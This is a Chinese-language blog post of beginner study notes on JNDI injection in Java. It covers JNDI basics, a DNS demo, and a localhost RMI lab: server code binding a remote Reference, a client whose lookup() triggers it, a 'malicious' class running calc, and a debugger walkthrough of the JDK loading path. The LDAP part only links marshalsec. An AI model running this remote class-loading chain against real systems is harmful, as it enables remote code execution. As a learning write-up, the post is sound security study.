+++
title = 'JNDI注入初学习'
date = '2024-09-24T17:08:41+08:00'
categories = ['Java', '学习', '安全']
tags = ['java安全']
+++

# JNDI注入初学习

## JNDI简介

`JNDI(Java Naming and Directory Interface)`是`Java`提供的`Java`命名和目录接口。通过调用`JNDI`的`API`可以定位资源和其他程序对象。

也就是说如果程序定义了JNDI的接口，我们则可以通过该接口API访问系统的==命令服务==和==目录服务==
JNDI可访问的现有的目录和服务有：JDBC ,LDAP,RMI,DNS,NIS,CORBA

| 协议  | 作用                                                         |
| ----- | ------------------------------------------------------------ |
| LDAP  | 轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容 |
| RMI   | JAVA远程远程方法调用注册                                     |
| DNS   | 域名服务                                                     |
| CORBA | 公共对象请求代理体系结构                                     |

### Naming Service 命名服务

命名服务就是将名称和对象进行广联，也就是一种映射；我们可以通过名称找到对应的对象的操作。在命名系统中，有几个重要的概念：

==Bindings==：表示一个名称和对应对象的绑定关系，也就是上边提到的。
==Context==：上下文，一个上下文中对应着一组名称到对象的绑定关系；可以在指定的上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在这个目录中查找文件，其中的子目录也可以称为上下文(subcontext)。
==References==：有些对象可能无法直接存储在系统内，这时候就以引用的形式进行存储，像c语言中的指针。引用中包含了获取的实际对象所需的信息，或者对象的实际状态。

### Directory Service 目录服务

目录服务是命名服务的拓展，除了提供名称和对象的关联，还允许对象具有属性。目录服务中的对象称为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。所以我们可以通过名称去查找对象，也能通过属性值去搜索对象。

### API

我们上边知道使用目录服务可以集中存储共享信息。在java应用中除了以常规的方式使用名称服务，还可以用目录服务作为对象存储的系统，即用目录服务来存储和获取java对象。
例如播放音乐服务，我们可以通过在目录服务中查找播放器，并获取一个播放器的对象，基于这个对象进行实际的服务操作。
为此，就有了JNDN，应用通过接口与具体的目录服务进行交互。看下面的图：
![image-20240923205221456](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409232052538.png)

### 实例：通过JNDI进行dns查询

```java
package top.foreverwl.study.demo;

import javax.naming.*;
import javax.naming.directory.*;
/**
 * @program: JNDI2
 * @description:
 * @author: 168
 * @create: 2024-09-24 14:47
 **/
public class JndiDns {
    public static void main(String[] args) throws NamingException {
        DirContext ctx = new InitialDirContext();
        Attributes attrs = ctx.getAttributes("dns:/www.baidu.com", new String[]{"A"});
        System.out.println(attrs.get("A"));
    }
}
//A: 111.206.208.135, 111.206.208.133
```

![image-20240924145245270](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241452303.png)

## JNDI注入

JNDI注入，即开发者在定义JDNI接口初始化时，==lookup()==方法的参数可控，攻击者可以将恶意的url传入参数，劫持java客户端的JNDI请求指向恶意的服务器地址，服务器响应了一个恶意的java对象载荷，对象被解析实例化的过程造成了注入攻击。

![image-20240923213837461](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409232138543.png)

### JNDI+RMI注入

先看一张JNDI注入对jdk版本的限制：
![image-20240924125843926](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241258976.png)

这里我使用的是 jdk8_u65

首先介绍两个类：

- javax.naming.Reference
- com.sun.jndi.rmi.registry.ReferenceWrapper

javax.naming.Reference类用来 表示一个对象的引用，它包含了对象的类名和一系列的地址信息。这个类可以用来指定一个对象的工厂类和工厂位置，而实现远程类加载和代码执行。
com.sun.jndi.rmi.registry.ReferenceWrapper正好就是为了将Reference封装为Remote使其能够在RMI注册表上绑定

![image-20240924152037369](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241520406.png)

我们接下来定于服务端，客户端，恶意字节码文件。

#### 服务端

```java
package top.foreverwl.study.rmi;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @program: JNDI
 * @description:
 * @author: 168
 * @create: 2024-09-23 22:03
 **/
public class ServerRmi {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry= LocateRegistry.createRegistry(7778);
        Reference reference = new Reference("calc","top.foreverwl.study.rmi.Calc","http://127.0.0.1:8081/");
        ReferenceWrapper wrapper=new ReferenceWrapper(reference);
        registry.bind("RCE",wrapper);

    }
}
```

这里注意Reference的第二个参数要为完整的类名(当时卡着了好久)，第一个参数随便命名就行
![image-20240924152649938](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241526976.png)

#### 客户端

```java
package top.foreverwl.study.rmi;

import javax.naming.InitialContext;
import javax.naming.NamingException;
/**
 * @program: JNDI2
 * @description:
 * @author: 168
 * @create: 2024-09-24 12:27
 **/
public class ClientRmi {
    public static void main(String[] args) throws NamingException {
        String uri="rmi://127.0.0.1:7778/RCE";
        InitialContext initialContext = new InitialContext();
        initialContext.lookup(uri);
    }
}
```

#### 恶意字节码

```java
package top.foreverwl.study.rmi;

import java.io.IOException;
/**
 * @program: JNDI
 * @description:
 * @author: 168
 * @create: 2024-09-23 22:18
 **/
public class Calc {
    public Calc() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```

![image-20240924163239077](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241632153.png)

#### 调试分析

现在lookup打断点，
![image-20240924163705083](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241637142.png)

进入getURLOrDefaultInitCtx方法。

![image-20240924163807362](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241638432.png)

首先判断是否有初始化上下文工厂构建器，如果有就返回默认的初始化上下文。(默认是没有的)。然后将name传给getURLScheme处理![](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241643598.png)

其实就是将rmi://127.0.0.1:7778/RCE  ==：==之前的协议给==scheme==；然后跟进到getURLContext中。
![image-20240924164836436](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241648505.png)

然后再跟进到getURLObject方法中：
![image-20240924165901118](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241659198.png)

使用ResourceManager.getFactory根据scheme以及其他的参数来查找对象工厂，这里scheme就是rmi，那么它将尝试加载==rmiURLContextFactory==这个类。找到工厂后，就调用factory.getObjectInstance来返回一个对象实例。

继续跟进到getFactory中。
![image-20240924170650859](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241706931.png)

此方法使用动态策略，根据给定的属性、上下文和其他信息去找加载和实例化特定的工厂类；用于后边创建JNDI上下文对象。

我们会发现className就是上面的rmiURLContextFactory

![image-20240924170905512](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409241709554.png)

以上步骤完成了JNDI的上下文环境的构建，后面就是要从构建好的上下文环境中去解析并获取想要的资源的过程，即lookup。

跟进到lookup方法
![image-20240924214459056](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409242144146.png)

getRootURLContext用于解析RMI URL并准备好一个上下文，该上下文可以进一步查找RMI对象；getResolvedObj用于获取刚才的var2，里面存着解析信息。
最后调用var3.lookup去解析剩余的rmi部分，就是我们要找的资源名称：RCE

跟进lookup
![image-20240924215508054](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409242155115.png)

跟进到decodeObject
![image-20240924222405122](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409242224191.png)

```
Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
```

这段代码判断远程对象是否被`ReferenceWrapper`封装，因为`ReferenceWrapper`类实现了`RemoteReference`接口，所以会执行`getReference`方法

![image-20240924222651002](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409242226063.png)

该方法的主要目的是根据给定的引用信息创建对象。

看后续代码：
在319行执行后，程序就弹出计算器了，然后报异常。我们看getObjectFactoryFromReference做了什么。
![image-20240924223204742](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409242232815.png)

首先，从本地的classpath中尝试加载factory的字节码，如果没有，再尝试通过URL去加载factory的字节码;

如果从URL中找到了factory的class，那么就会下载到本地执行，此时我们的恶意类就成功加载进内存了，所以静态代码块中的内容就会被执行。

最后还会把factory给实例化，此时也会执行无参构造方法，所以执行了我们恶意class的无参构造方法。

```
(ObjectFactory) clas.newInstance()
```

### JNDI+LDAP注入

前边图片我们可以看到，在8u191之前使用这个。

我们这里使用写好的ldap服务端[RandomRobbieBF/marshalsec-jar: marshalsec-0.0.3-SNAPSHOT-all compiled on X64 (github.com)](https://github.com/RandomRobbieBF/marshalsec-jar)

然后自己本地起一个客户端

```

```



## 总结

初学习，复习了一下rmi然后跟着文章动调了一下；emm。动调能力太弱了。不说了睡觉去了。。

